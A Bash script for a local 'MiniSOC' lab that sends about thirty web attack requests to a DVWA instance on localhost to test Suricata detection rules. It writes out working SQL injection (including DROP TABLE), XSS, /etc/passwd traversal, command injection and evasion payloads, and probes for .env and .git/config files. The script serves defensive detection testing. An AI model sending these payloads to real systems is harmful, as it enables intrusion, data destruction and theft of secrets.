#!/bin/bash

# Web Attack Testing Script for MiniSOC Suricata
# ==============================================
# This script tests various web attack detection rules

echo "🌐 Web Attack Testing Script for MiniSOC Suricata"
echo "================================================"
echo ""

# Configuration
TARGET_HOST="localhost"
TARGET_PORT="8081"  # DVWA port
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to log with timestamp
log() {
    echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1"
}

# Function to test attack
test_attack() {
    local attack_name="$1"
    local attack_url="$2"
    local description="$3"
    
    log "${YELLOW}Testing: ${attack_name}${NC}"
    log "Description: ${description}"
    log "URL: ${attack_url}"
    
    # Send the attack request
    response=$(curl -s -w "%{http_code}" -o /dev/null "${attack_url}" 2>/dev/null)
    
    if [ $? -eq 0 ]; then
        log "${GREEN}✓ Attack sent successfully (HTTP: ${response})${NC}"
    else
        log "${RED}✗ Failed to send attack${NC}"
    fi
    
    echo ""
    sleep 2
}

# Test 1: SQL Injection Attacks
echo "🔍 Testing SQL Injection Attacks"
echo "--------------------------------"

test_attack "SQL Injection - UNION SELECT" \
    "${BASE_URL}/vulnerabilities/sqli/?id=1' UNION SELECT 1,2,3--" \
    "Basic UNION SELECT injection"

test_attack "SQL Injection - OR 1=1" \
    "${BASE_URL}/vulnerabilities/sqli/?id=1' OR 1=1--" \
    "OR condition injection"

test_attack "SQL Injection - DROP TABLE" \
    "${BASE_URL}/vulnerabilities/sqli/?id=1'; DROP TABLE users--" \
    "DROP TABLE injection"

test_attack "SQL Injection - INSERT" \
    "${BASE_URL}/vulnerabilities/sqli/?id=1'; INSERT INTO users VALUES (1,'test','test')--" \
    "INSERT injection"

# Test 2: XSS (Cross-Site Scripting) Attacks
echo "🔍 Testing XSS Attacks"
echo "----------------------"

test_attack "XSS - Basic Script" \
    "${BASE_URL}/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
    "Basic XSS with script tag"

test_attack "XSS - JavaScript Event" \
    "${BASE_URL}/vulnerabilities/xss_r/?name=<img src=x onerror=alert('XSS')>" \
    "XSS with JavaScript event"

test_attack "XSS - Encoded Script" \
    "${BASE_URL}/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('XSS')%3C/script%3E" \
    "URL encoded XSS"

test_attack "XSS - SVG Script" \
    "${BASE_URL}/vulnerabilities/xss_r/?name=<svg onload=alert('XSS')>" \
    "XSS with SVG element"

# Test 3: Directory Traversal Attacks
echo "🔍 Testing Directory Traversal Attacks"
echo "--------------------------------------"

test_attack "Directory Traversal - Basic" \
    "${BASE_URL}/vulnerabilities/fi/?page=../../../etc/passwd" \
    "Basic directory traversal"

test_attack "Directory Traversal - Encoded" \
    "${BASE_URL}/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
    "URL encoded directory traversal"

test_attack "Directory Traversal - Double" \
    "${BASE_URL}/vulnerabilities/fi/?page=....//....//....//etc/passwd" \
    "Double dot directory traversal"

# Test 4: Command Injection Attacks
echo "🔍 Testing Command Injection Attacks"
echo "------------------------------------"

test_attack "Command Injection - Pipe" \
    "${BASE_URL}/vulnerabilities/exec/?ip=127.0.0.1|whoami" \
    "Command injection with pipe"

test_attack "Command Injection - Semicolon" \
    "${BASE_URL}/vulnerabilities/exec/?ip=127.0.0.1;whoami" \
    "Command injection with semicolon"

test_attack "Command Injection - AND" \
    "${BASE_URL}/vulnerabilities/exec/?ip=127.0.0.1&&whoami" \
    "Command injection with AND"

test_attack "Command Injection - Backtick" \
    "${BASE_URL}/vulnerabilities/exec/?ip=127.0.0.1\`whoami\`" \
    "Command injection with backticks"

# Test 5: File Upload Attacks
echo "🔍 Testing File Upload Attacks"
echo "------------------------------"

test_attack "File Upload - PHP Shell" \
    "${BASE_URL}/vulnerabilities/upload/" \
    "Attempting to upload PHP shell (manual test required)"

test_attack "File Upload - JSP Shell" \
    "${BASE_URL}/vulnerabilities/upload/" \
    "Attempting to upload JSP shell (manual test required)"

# Test 6: Information Disclosure Attacks
echo "🔍 Testing Information Disclosure Attacks"
echo "-----------------------------------------"

test_attack "Info Disclosure - PHP Info" \
    "${BASE_URL}/phpinfo.php" \
    "PHP info disclosure"

test_attack "Info Disclosure - Git" \
    "${BASE_URL}/.git/config" \
    "Git configuration disclosure"

test_attack "Info Disclosure - Environment" \
    "${BASE_URL}/.env" \
    "Environment file disclosure"

# Test 7: Authentication Bypass Attacks
echo "🔍 Testing Authentication Bypass Attacks"
echo "----------------------------------------"

test_attack "Auth Bypass - Admin Panel" \
    "${BASE_URL}/admin/" \
    "Admin panel access attempt"

test_attack "Auth Bypass - Login" \
    "${BASE_URL}/login.php" \
    "Login page access"

# Test 8: API Security Attacks
echo "🔍 Testing API Security Attacks"
echo "-------------------------------"

test_attack "API SQL Injection" \
    "${BASE_URL}/api/users?id=1' UNION SELECT 1,2,3--" \
    "API SQL injection"

test_attack "API XSS" \
    "${BASE_URL}/api/users?name=<script>alert('XSS')</script>" \
    "API XSS injection"

# Test 9: Social Engineering Attacks
echo "🔍 Testing Social Engineering Attacks"
echo "-------------------------------------"

test_attack "Phishing - Bank Login" \
    "${BASE_URL}/login-bank.php" \
    "Fake bank login page"

test_attack "Phishing - PayPal" \
    "${BASE_URL}/login-paypal.php" \
    "Fake PayPal login page"

test_attack "Phishing - Amazon" \
    "${BASE_URL}/login-amazon.php" \
    "Fake Amazon login page"

# Test 10: Advanced Evasion Techniques
echo "🔍 Testing Advanced Evasion Techniques"
echo "--------------------------------------"

test_attack "Case Manipulation" \
    "${BASE_URL}/vulnerabilities/sqli/?id=1' UnIoN SeLeCt 1,2,3--" \
    "SQL injection with case manipulation"

test_attack "Comment Injection" \
    "${BASE_URL}/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/1,2,3--" \
    "SQL injection with comment injection"

test_attack "Null Byte Injection" \
    "${BASE_URL}/vulnerabilities/fi/?page=../../../etc/passwd%00" \
    "Directory traversal with null byte"

echo "🎯 Web Attack Testing Complete!"
echo "================================"
echo ""
echo "📊 Summary:"
echo "- SQL Injection tests: 4"
echo "- XSS tests: 4"
echo "- Directory Traversal tests: 3"
echo "- Command Injection tests: 4"
echo "- File Upload tests: 2"
echo "- Information Disclosure tests: 3"
echo "- Authentication Bypass tests: 2"
echo "- API Security tests: 2"
echo "- Social Engineering tests: 3"
echo "- Advanced Evasion tests: 3"
echo ""
echo "Total tests executed: 30"
echo ""
echo "🔍 Check Suricata logs for alerts:"
echo "sudo docker compose logs suricata-host | grep -i alert"
echo ""
